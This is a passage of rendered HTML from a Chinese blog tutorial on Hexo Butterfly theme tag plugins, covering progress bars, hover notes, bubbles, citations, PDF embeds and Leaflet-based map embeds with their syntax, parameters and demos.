data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress [width] [color] [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>width</code>: 0到100的阿拉伯数字</li><li><code>color</code>: 颜色，取值有red,yellow,green,cyan,blue,gray</li><li><code>text</code>:进度条上的文字内容</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress 10 red 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 30 yellow 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 50 green 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 70 cyan 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 90 blue 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 100 gray 进度条样式预览 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-red"  style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-yellow"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 50%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-cyan"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-gray"  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-26-注释-notation">2.26 注释 notation</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota [label] , [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p><code>label</code>: 注释词汇</p></li><li><p><code>text</code>: 悬停显示的注解内容</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota 把鼠标移动到我上面试试 ,可以看到注解内容出现在顶栏 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><span class='nota' data-nota='可以看到注解内容出现在顶栏'>把鼠标移动到我上面试试</span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-27-气泡注释-bubble">2.27 气泡注释 bubble</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bubble [content] , [notation] ,[background-color] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>content</code>: 注释词汇</li><li><code>notation</code>: 悬停显示的注解内容</li><li><code>background-color</code>: 可选，气泡背景色。默认为“#71a4e3”</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的&#123;% bubble 兄弟相邻选择器,&quot;例如 h1 + p &#123;margin-top:50px;&#125;&quot; %&#125;，&#123;% bubble flex布局,&quot;Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;,&quot;#ec5830&quot; %&#125;，&#123;% bubble transform变换,&quot;transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。&quot;,&quot;#1db675&quot; %&#125;，animation的&#123;% bubble 贝塞尔速度曲线,&quot;贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋&quot;,&quot;#de4489&quot; %&#125;写法，还有今天刚看到的&#123;% bubble clip-path,&quot;clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。&quot;,&quot;#868fd7&quot; %&#125;属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的<span class="bubble-content">兄弟相邻选择器</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#71a4e3;">例如 h1 + p {margin-top:50px;}</span></span>，<span class="bubble-content">flex布局</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">Flex 是 Flexible Box 的缩写，意为弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;</span></span>，<span class="bubble-content">transform变换</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#1db675;">transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。</span></span>，animation的<span class="bubble-content">贝塞尔速度曲线</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#de4489;">贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋</span></span>写法，还有今天刚看到的<span class="bubble-content">clip-path</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。</span></span>属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-28-引用文献-reference">2.28 引用文献 reference</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% referto [id] , [literature] %&#125;</span><br><span class="line">&#123;% referfrom [id] , [literature] , [url] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>referto 引用上标</p><ul><li><p><code>id</code>: 上标序号内容，需与referfrom标签的id对应才能实现跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li></ul></li><li><p>referfrom 引用出处</p><ul><li><p><code>id</code>: 序号内容，需与referto标签的id对应才能实现 跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li><li><p><code>url</code>: 引用的参考文献链接，可省略</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Akilarの糖果屋(akilar.top)是一个私人性质的博客&#123;% referto &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27; %&#125;，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架&#123;% referto &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27; %&#125;，Butterfly主题&#123;% referto &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">本项目参考了Volantis&#123;% referto &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27; %&#125;的标签样式。引入<span class="code">`[tag].js`</span>，并针对<span class="code">`butterfly`</span>主题修改了相应的<span class="code">`[tag].styl`</span>。在此鸣谢<span class="code">`Volantis`</span>主题众开发者。</span><br><span class="line">主要参考内容包括各个volantis的内置标签插件文档&#123;% referto &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27; %&#125;</span><br><span class="line">Butterfly主题的各个衍生魔改&#123;% referto &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27; %&#125;&#123;% referto &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27; %&#125;&#123;% referto &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27; %&#125;&#123;% referto &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% referfrom &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27;,&#x27;https://jq.qq.com/?<span class="emphasis">_wv=1027&amp;k=pGLB2C0N&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27;,&#x27;https://hexo.io/zh-cn/docs/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27;,&#x27;https://butterfly.js.org/posts/21cfbf15/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27;,&#x27;https://volantis.js.org/v5/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27;,&#x27;https://volantis.js.org/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27;,&#x27;https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27;,&#x27;https://lovelijunyi.gitee.io/posts/c898.html&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27;,&#x27;https://github.com/l-lin/font-awesome-animation&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27;,&#x27;https://www.antmoe.com/posts/3b43914f/&#x27; %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>Akilarの糖果屋(akilar.top)是一个私人性质的博客<span class="hidden-anchor" id="referto_[1]"></span><sup class="reference"><a href="#referfrom_[1]">[1]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Akilarの糖果屋群聊简介</span><span class="reference-title">参考资料</span></span></span>，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架<span class="hidden-anchor" id="referto_[2]"></span><sup class="reference"><a href="#referfrom_[2]">[2]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Hexo中文文档</span><span class="reference-title">参考资料</span></span></span>，Butterfly主题<span class="hidden-anchor" id="referto_[3]"></span><sup class="reference"><a href="#referfrom_[3]">[3]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档(一) 快速开始</span><span class="reference-title">参考资料</span></span></span></p><p>本项目参考了Volantis<span class="hidden-anchor" id="referto_[4]"></span><sup class="reference"><a href="#referfrom_[4]">[4]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">hexo-theme-volantis 标签插件</span><span class="reference-title">参考资料</span></span></span>的标签样式。引入<code>[tag].js</code>，并针对<code>butterfly</code>主题修改了相应的<code>[tag].styl</code>。在此鸣谢<code>Volantis</code>主题众开发者。<br>主要参考内容包括各个volantis的内置标签插件文档<span class="hidden-anchor" id="referto_[5]"></span><sup class="reference"><a href="#referfrom_[5]">[5]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Volantis文档:内置标签插件</span><span class="reference-title">参考资料</span></span></span><br>Butterfly主题的各个衍生魔改<span class="hidden-anchor" id="referto_[6]"></span><sup class="reference"><a href="#referfrom_[6]">[6]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档:标签外挂（Tag Plugins</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[7]"></span><sup class="reference"><a href="#referfrom_[7]">[7]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小弋の生活馆全样式预览</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[8]"></span><sup class="reference"><a href="#referfrom_[8]">[8]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">l-lin-font-awesome-animation</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[9]"></span><sup class="reference"><a href="#referfrom_[9]">[9]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小康的butterfly主题使用文档</span><span class="reference-title">参考资料</span></span></span></p><div class="reference-source"><span class="hidden-anchor" id="referfrom_[1]"></span><a class="reference-anchor" href="#referto_[1]">[1]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://jq.qq.com/?_wv=1027&k=pGLB2C0N">Akilarの糖果屋群聊简介</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[2]"></span><a class="reference-anchor" href="#referto_[2]">[2]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://hexo.io/zh-cn/docs/">Hexo中文文档</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[3]"></span><a class="reference-anchor" href="#referto_[3]">[3]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安装文档(一) 快速开始</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[4]"></span><a class="reference-anchor" href="#referto_[4]">[4]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/v5/tag-plugins/">hexo-theme-volantis 标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[5]"></span><a class="reference-anchor" href="#referto_[5]">[5]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/tag-plugins/">Volantis文档:内置标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[6]"></span><a class="reference-anchor" href="#referto_[6]">[6]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">Butterfly 安装文档:标签外挂（Tag Plugins</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[7]"></span><a class="reference-anchor" href="#referto_[7]">[7]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://lovelijunyi.gitee.io/posts/c898.html">小弋の生活馆全样式预览</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[8]"></span><a class="reference-anchor" href="#referto_[8]">[8]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://github.com/l-lin/font-awesome-animation">l-lin-font-awesome-animation</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[9]"></span><a class="reference-anchor" href="#referto_[9]">[9]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://www.antmoe.com/posts/3b43914f/">小康的butterfly主题使用文档</a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-29-PDF展示">2.29 PDF展示</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf 文件路径 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>文件路径</code>: 可以是相对路径或者是在线链接</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 1.本地文件:在md文件路径下创建一个同名文件夹，其内放pdf文件名为xxx.pdf的文件</span></span><br><span class="line">&#123;% pdf xxx.pdf %&#125;</span><br><span class="line"><span class="section"># 2.在线链接</span></span><br><span class="line">&#123;% pdf https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>2.在线链接(要放到最外层才能起作用)</p><pre><code>&lt;div class=&quot;row&quot;&gt;&lt;embed src=&quot;https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;&lt;/div&gt;</code></pre><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-30-Hexo-tag-map-插件">2.30 Hexo-tag-map 插件</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% + 标签值 + 经度 + 纬度 + 文本 + 缩放等级 + 宽 + 高 + 默认图层 + %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th style="text-align:center">地图名</th><th style="text-align:center">标签值 &lt;必填&gt;</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">缩放等级 (默认 14)</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">默认图层 (默认 1)</th></tr></thead><tbody><tr><td style="text-align:center">混合地图</td><td style="text-align:center">map</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~7</td></tr><tr><td style="text-align:center">谷歌地图</td><td style="text-align:center">googleMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~20</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">高德地图</td><td style="text-align:center">gaodeMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">百度地图</td><td style="text-align:center">baiduMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 4~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~2</td></tr><tr><td style="text-align:center">Geoq 地图</td><td style="text-align:center">geoqMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~5</td></tr><tr><td style="text-align:center">openstreet 地图</td><td style="text-align:center">openstreetMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">不支持此参数</td></tr></tbody></table><ol><li>参数之间，用英文逗号相隔</li><li>参数必须按上述事例顺序输入，不得为空</li><li>同一个页面，同一组经纬度值，只能插入一个相同标签值的地图 (若有需要，可以将第二个地图上，经度或纬度末尾删除一两个数)</li><li>参数取值必须在上述范围内</li><li>默认图层：即地图叠加层的值，默认常规地图还是卫星地图，可按地图显示顺序取值</li><li>缩放等级，数字越大，地图比例尺越小，显示的越精细</li><li>除标签值外，其他参数选填，但 每个参数的左边的参数必填</li><li>谷歌地图需要外网才能加载查看</li></ol><p>坐标获取：<a href="https://lbs.amap.com/tools/picker">高德地图坐标拾取系统</a> 、<a href="https://api.map.baidu.com/lbsapi/getpoint/index.html">百度地图坐标拾取系统</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% map 120.101101,30.239119 %&#125;</span><br><span class="line">&#123;% googleMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！ %&#125;</span><br><span class="line">&#123;% geoqMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！, 13, 90%, 320px, 3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div class="map-box" style="margin: 0.8rem 0 1.6rem 0;"><div id="map-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div></div><script type="text/javascript">var normalm=L.tileLayer.chinaProvider('GaoDe.Normal.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imgm=L.tileLayer.chinaProvider('GaoDe.Satellite.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imga=L.tileLayer.chinaProvider('GaoDe.Satellite.Annotion',{maxZoom:20,minZoom:1,attribution:'高德地图'});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:20,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'});routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1,attribution:'Google Maps'});var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:21,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm]),image=L.layerGroup([imgm,imga]);var baseLayers={"高德地图":normal,"智图地图":normalm1,"谷歌地图":normalMap,"高德卫星地图":imgm,"谷歌卫星地图":satelliteMap,"高德卫星标注":image,"谷歌卫星标注":routeMap};var mymap=L.map('map-120.101101-30.239119',{center:[30.239119,120.101101],zoom:14,layers:[normal],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="googleMap-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:22,minZoom:1,attribution:'Google Maps'});var baseLayers={"谷歌地图":normalMap,"谷歌卫星图":satelliteMap,"谷歌卫星标注": routeMap};var overlayLayers={};var mymap=L.map("googleMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:14,layers:[normalMap],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="geoqMap-120.101101-30.239119" style="max-width:90%; height:320px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm2=L.tileLayer.chinaProvider('Geoq.Normal.PurplishBlue',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var 